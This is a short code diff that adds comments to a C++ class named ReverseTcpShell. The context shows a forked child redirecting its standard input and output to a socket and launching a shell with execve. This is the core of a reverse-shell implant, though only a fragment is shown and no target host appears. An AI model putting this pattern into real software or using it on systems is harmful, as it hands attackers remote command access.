@@ -22,6 +22,7 @@ ReverseTcpShell::ReverseTcpShell(asio::io_context &ioContext) :
 
 ReverseTcpShell::~ReverseTcpShell()
 {
+    //! Cancel all io operations for the Unix sockets.
     m_parentSocket.cancel();
     m_childSocket.cancel();
 
@@ -35,10 +36,14 @@ bool ReverseTcpShell::Start()
     if (0 == pid)
     {
         //! Child.
+
+        //! Dup2 used to close original standard IO file handles
+        //! and redirect them to the child socket.
         dup2(m_childSocket.native_handle(), STDIN_FILENO);
         dup2(m_childSocket.native_handle(), STDOUT_FILENO);
         dup2(m_childSocket.native_handle(), STDERR_FILENO);
 
+        //! Initialize the shell variables.
         std::vector<char> shellEnv;
         std::vector<char> pathEnv;
 
@@ -48,6 +53,7 @@ bool ReverseTcpShell::Start()
         char* env[] = { shellEnv.data(), pathEnv.data() };
         char* shell[] = { DEFAULT_SHELL, NULL };
 
+        //! Execve to load the shell process and execute it.
         const int result = execve(shell[0], shell, env);
         if (-1 == result)
             exit(1);
